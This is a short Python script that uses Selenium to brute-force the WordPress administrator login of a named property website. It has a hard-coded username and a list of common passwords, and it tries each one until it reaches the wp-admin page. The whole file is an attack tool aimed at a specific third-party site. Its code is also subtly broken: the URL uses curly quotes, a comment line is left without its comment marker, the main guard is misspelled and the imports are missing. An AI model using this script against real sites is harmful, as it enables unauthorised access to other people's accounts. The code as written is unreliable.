LOGIN_URL = “https://larizproperty.com/wp-login”
USERNAME = "larizpro"
PASSWORD_LIST = ["password12", "admin123", "123456", "password", "letmein", "qwerty", "password123"]

def setup_driver():
    service = Service(ChromeDriverManager().install())
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    return webdriver.Chrome(service=service, options=options)

def brute_force_login():
    driver = setup_driver()
    try:
        for password in PASSWORD_LIST:
            print(f"\nTrying: {password}")
            
            driver.get(LOGIN_URL)
            time.sleep(1)  # Let the page load

            try:
                Wait for login input fields
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.ID, "user_login"))
                ).clear()
                driver.find_element(By.ID, "user_login").send_keys(USERNAME)
                
                driver.find_element(By.ID, "user_pass").clear()
                driver.find_element(By.ID, "user_pass").send_keys(password)
                
                driver.find_element(By.ID, "wp-submit").click()
                
                time.sleep(2)  # Let page load
                if "wp-admin" in driver.current_url:
                    print(f"✅ SUCCESS! Password found: {password}")
                    break
                else:
                    print("❌ Failed")

            except Exception as e:
                print(f"⚠️ Error during attempt: {str(e)}")
                continue

    except Exception as e:
        print(f"🔥 Critical error: {str(e)}")
    finally:
        input("\nPress Enter to close browser...")
        driver.quit()

if _name_ == "__main__":
    brute_force_login()
